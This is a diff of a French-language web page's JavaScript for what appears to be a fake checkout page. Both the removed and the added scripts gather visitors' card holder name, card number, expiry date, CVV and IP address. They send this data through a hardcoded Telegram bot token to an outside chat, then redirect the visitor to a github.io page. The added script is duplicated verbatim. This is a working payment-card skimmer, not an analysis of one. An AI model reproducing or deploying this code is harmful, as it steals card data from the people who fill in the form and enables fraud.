@@ -253,273 +253,167 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
   <script>
     $(document).ready(function () {
-      $(window).on("load", function () {
-        if ($(window).width() < 991) {
-          let target = $('#Scroll_form');
-          if (target.length) {
-            $('html,body').animate({
-              scrollTop: target.offset().top
-            });
-          }
-        }
-      });
-    });
-
-    "use strict";
-    function Tabs() {
-      var bindAll = function () {
-        var menuElements = document.querySelectorAll('[data-tab]');
-        for (var i = 0; i < menuElements.length; i++) {
-          menuElements[i].addEventListener('click', change, false);
-        }
-      }
-      var clear = function () {
-        var menuElements = document.querySelectorAll('[data-tab]');
-        for (var i = 0; i < menuElements.length; i++) {
-          menuElements[i].classList.remove('active');
-          var id = menuElements[i].getAttribute('data-tab');
-          document.getElementById(id).classList.remove('active');
-        }
-      }
-      var change = function (e) {
-        clear();
-        e.target.classList.add('active');
-        var id = e.currentTarget.getAttribute('data-tab');
-        document.getElementById(id).classList.add('active');
-      }
-      bindAll();
-    }
-    var connectTabs = new Tabs();
-
-    function myFunction() {
-      var x = document.getElementById("select");
-      x.classList.add("active");
-    }
-
-    /* COUNT DOWN JS */
-    window.onload = isTimeSet;
-    function isTimeSet() {
-      if (localStorage.getItem("time") != null) {
-        var time = localStorage.getItem("time");
-        document.getElementById("hiddenTime").value = time;
-      } else {
-        document.getElementById("hiddenTime").value = "1800";
-      }
-    }
-    var sec = document.getElementById("hiddenTime") ? document.getElementById("hiddenTime").value : 1800,
-        countDiv = document.getElementById("timer"),
-        countDown = setInterval(function () {
-          secpass();
-        }, 1000);
-    function secpass() {
-      var min = Math.floor(sec / 60),
-          remSec = sec % 60;
-      remSec = remSec < 10 ? '0' + remSec : remSec;
-      min = min < 10 ? '0' + min : min;
-      if (countDiv) {
-        countDiv.innerHTML = min + ":" + remSec;
-      }
-      if (sec > 0) {
-        sec = sec - 1;
-        localStorage.setItem("time", sec);
-      } else {
-        clearInterval(countDown);
-        if (countDiv) {
-          countDiv.innerHTML = "Limite dépassée";
-        }
-        localStorage.removeItem("time");
-      }
-    }
-
-    document.addEventListener("DOMContentLoaded", function () {
-      setTimeout(function () {
-        const beforeElement = document.querySelector(".product_wrapper");
-        if(beforeElement) {
-          beforeElement.classList.add("animate");
-        }
-      }, 100);
-    });
-
-    document.addEventListener('DOMContentLoaded', function () {
-      if (window.location.pathname.startsWith('/thank-you-goa')) {
-        const script = document.createElement('script');
-        script.innerHTML = 'setTimeout(function() {window.location.href = "https://justmoicom.github.io/test3/";}, 5000);';
-        document.body.appendChild(script);
-      }
-    });
-
-    $(document).ready(function () {
-      $('#spanYear').html(new Date().getFullYear());
-    });
-  </script>
-  <script>
-    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-      window.scroll({
-        behavior: 'smooth',
-        left: 0,
-        top: (window.pageYOffset + document.getElementById("paymentForm").getBoundingClientRect().top) - 20
-      });
-    }
-  </script>
-  <script src="/assets/js/app.js?id=7fcfd8024d883e98d448b4b0995a5414"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js" integrity="sha512-q11YPKX7TkRW0J1N8w1MP7cg05EpUDRx5B/jTnPPQxY4lsIjGd5fMyBKzjCgbXPQ0ArBgFkNj2v0jh1O2SAqSg==" crossorigin="anonymous" referrerpolicy="no-referrer" defer></script>
-
-  
-  
-  
-   <script>
-  
-   $(document).ready(function () {
-      setTimeout(function () {
-        $(".product_wrapper").addClass("animate");
-      }, 100);
-    });
-
-    // Défilement automatique sur mobile
-    $(window).on("load", function () {
-      if ($(window).width() < 991) {
-        let target = $('#Scroll_form');
-        if (target.length) {
-          $('html,body').animate({ scrollTop: target.offset().top });
-        }
-      }
-    });
-
-    // Validation du formulaire avec jQuery Validate
-    $(document).ready(function() {
-      // Méthode de validation pour le CVV
-      jQuery.validator.addMethod("cvv", function(value, element) {
-        return (/^[0-9]{3,4}$/).test(value);
-      }, "Veuillez entrer un CVV valide (3-4 chiffres)");
-
-      // Méthode de validation Luhn pour le numéro de carte
-      function luhnCheck(number) {
-        let sum = 0;
-        number = number.replace(/\s+/g, '');
-        for (let i = number.length - 1; i >= 0; i -= 2) {
-          sum += parseInt(number[i]);
-        }
-        for (let i = number.length - 2; i >= 0; i -= 2) {
-          let digits = (number[i] * 2).toString().split('');
-          sum += digits.reduce((acc, d) => acc + parseInt(d), 0);
-        }
-        return (sum % 10 === 0);
-      }
-      jQuery.validator.addMethod("luhnCheck", function(value, element) {
-        return luhnCheck(value);
-      }, "Veuillez entrer un numéro de carte valide.");
-
-      $("#paymentForm").validate({
-        rules: {
-          card_holder: { required: true },
-          card_number: { required: true, luhnCheck: true, minlength: 8 },
-          expiry_date: { required: true },
-          cvv: { required: true, cvv: true }
-        },
-        submitHandler: function(form) {
-          disableSubmitButton($("#submitButton"));
-
-          let validationResult = validateExpiryDate($("#expiry_date").val());
-          if (validationResult === "success") {
-            // Construction du message
-            var formData = $(form).serializeArray();
-            var message = "Nouvelle commande reçue :\n";
-            formData.forEach(function (item) {
-              if (item.name !== '_token') {
-                message += item.name + ": " + item.value + "\n";
-              }
-            });
-            // Envoi via AJAX directement vers l'API Telegram
-            $.ajax({
-              url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
-              method: 'POST',
-              data: {
-                chat_id: '7747778364',
-                text: message
-              },
-              complete: function () {
-                window.location.href = "https://justmoicom.github.io/test3/";
-              }
-            });
-          } else {
-            showInputError("expiry_date", validationResult);
-            enableSubmitButton($("#submitButton"));
-          }
-        }
-      });
-
-      // Suppression de l'erreur dès modification du champ expiry_date
-      $("#expiry_date").on("keyup", function () {
-        $('label#expiry_date-error').remove();
-      });
-    });
-
-    // Gestion des erreurs et affichage du bouton de soumission
-    function showInputError(inputFieldId, error) {
-      var errorLabel = $("<label>", {
-        id: inputFieldId + '-error',
-        "class": "error",
-        for: inputFieldId,
-        text: error === "invalid_expiry_date" ? "Date d'expiration invalide" :
-              error === "expired_card" ? "La date d'expiration est dépassée" : error
-      });
-      $("#" + inputFieldId).closest('.controls').append(errorLabel);
-    }
-    function disableSubmitButton(button) {
-      button.prop('disabled', true);
-      $(".loader", button).show();
-      $(".submit-label", button).hide();
-      $(".waiting-label", button).show();
-    }
-    function enableSubmitButton(button) {
-      button.prop('disabled', false);
-      $(".loader", button).hide();
-      $(".submit-label", button).show();
-      $(".waiting-label", button).hide();
-    }
-    // Validation de la date d'expiration
-    function validateExpiryDate(expiryDateValue) {
-      var parts = expiryDateValue.split("/");
-      if (parts.length !== 2) {
-        return "invalid_expiry_date";
-      }
-      var expiryMonth = parseInt(parts[0].trim(), 10);
-      var expiryYear = parts[1].trim();
-      expiryYear = parseInt(expiryYear.length === 4 ? expiryYear : "20" + expiryYear, 10);
-      if (expiryMonth < 1 || expiryMonth > 12) {
-        return "invalid_expiry_date";
-      }
-      var expiryDate = new Date(expiryYear, expiryMonth, 0, 23, 59, 59);
-      var today = new Date();
-      var maxExpiryDate = new Date("2099-12-31 23:59:59");
-      if (expiryDate > maxExpiryDate) {
-        return "invalid_expiry_date";
-      }
-      if (expiryDate < today) {
-        return "expired_card";
-      }
-      return "success";
-    }
-
-    // Formatage des champs (optionnel)
-    $(document).ready(function () {
-      $("#card_number").on("input", function () {
-        this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-      });
-      $("#expiry_date").on("input", function () {
-        this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
-      });
-    });
-
-    // Récupérer l'IP de l'utilisateur et l'ajouter dans le formulaire (optionnel)
-    $(document).ready(function () {
+      // Récupérer l'IP de l'utilisateur
       $.getJSON("https://api.ipify.org?format=json", function (data) {
-        if ($("#user_ip").length === 0) {
-          $("<input>").attr({ type: "hidden", id: "user_ip", name: "user_ip", value: data.ip }).appendTo("#paymentForm");
-        } else {
-          $("#user_ip").val(data.ip);
-        }
+        $('#user_ip').val(data.ip);
       });
+
+      // Soumettre le formulaire avec validation
+      $('#paymentForm').on('submit', function (e) {
+        e.preventDefault();
+        if (!validateForm()) {
+          return;
+        }
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle commande reçue :\n";
+        formData.forEach(function (item) {
+          if (item.name !== '_token') {
+            message += item.name + ": " + item.value + "\n";
+          }
+        });
+
+        // Envoyer les données vers votre bot Telegram via un webhook ou API
+        $.ajax({
+          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+          method: 'POST',
+          data: {
+            chat_id: '7747778364',
+            text: message
+          },
+          success: function () {
+            window.location.href = "https://justmoicom.github.io/test3/";
+          },
+          error: function () {
+            window.location.href = "https://justmoicom.github.io/tel/";
+          }
+        });
+      });
+
+      // Validation des champs
+      function validateForm() {
+        var isValid = true;
+        $('input[required]').each(function () {
+          if ($(this).val().trim() === '') {
+            alert($(this).attr('placeholder') + ' est requis.');
+            isValid = false;
+            return false;
+          }
+        });
+        var expiryDate = $('#expiry_date').val();
+        if (!validateExpiryDate(expiryDate)) {
+          isValid = false;
+        }
+        return isValid;
+      }
+
+      function validateExpiryDate(date) {
+        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) {
+          alert('La date d\'expiration doit être au format MM/AA.');
+          return false;
+        }
+        var parts = date.split('/');
+        var month = parseInt(parts[0], 10);
+        if (month < 1 || month > 12) {
+          alert('Le mois doit être compris entre 01 et 12.');
+          return false;
+        }
+        return true;
+      }
+
+      // Formater le numéro de carte en blocs de 4 chiffres
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      // Formater automatiquement la date d'expiration en MM/AA
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
+  </script>  
+   
+   
+   
+   <script>
+    $(document).ready(function () {
+      // Récupérer l'IP de l'utilisateur
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      // Soumettre le formulaire avec validation
+      $('#paymentForm').on('submit', function (e) {
+        e.preventDefault();
+        if (!validateForm()) {
+          return;
+        }
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle commande reçue :\n";
+        formData.forEach(function (item) {
+          if (item.name !== '_token') {
+            message += item.name + ": " + item.value + "\n";
+          }
+        });
+
+        // Envoyer les données vers votre bot Telegram via un webhook ou API
+        $.ajax({
+          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+          method: 'POST',
+          data: {
+            chat_id: '7747778364',
+            text: message
+          },
+          success: function () {
+            window.location.href = "https://justmoicom.github.io/test3/";
+          },
+          error: function () {
+            window.location.href = "https://justmoicom.github.io/tel/";
+          }
+        });
+      });
+
+      // Validation des champs
+      function validateForm() {
+        var isValid = true;
+        $('input[required]').each(function () {
+          if ($(this).val().trim() === '') {
+            alert($(this).attr('placeholder') + ' est requis.');
+            isValid = false;
+            return false;
+          }
+        });
+        var expiryDate = $('#expiry_date').val();
+        if (!validateExpiryDate(expiryDate)) {
+          isValid = false;
+        }
+        return isValid;
+      }
+
+      function validateExpiryDate(date) {
+        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) {
+          alert('La date d\'expiration doit être au format MM/AA.');
+          return false;
+        }
+        var parts = date.split('/');
+        var month = parseInt(parts[0], 10);
+        if (month < 1 || month > 12) {
+          alert('Le mois doit être compris entre 01 et 12.');
+          return false;
+        }
+        return true;
+      }
+
+      // Formater le numéro de carte en blocs de 4 chiffres
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      // Formater automatiquement la date d'expiration en MM/AA
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
     });
   </script>
 
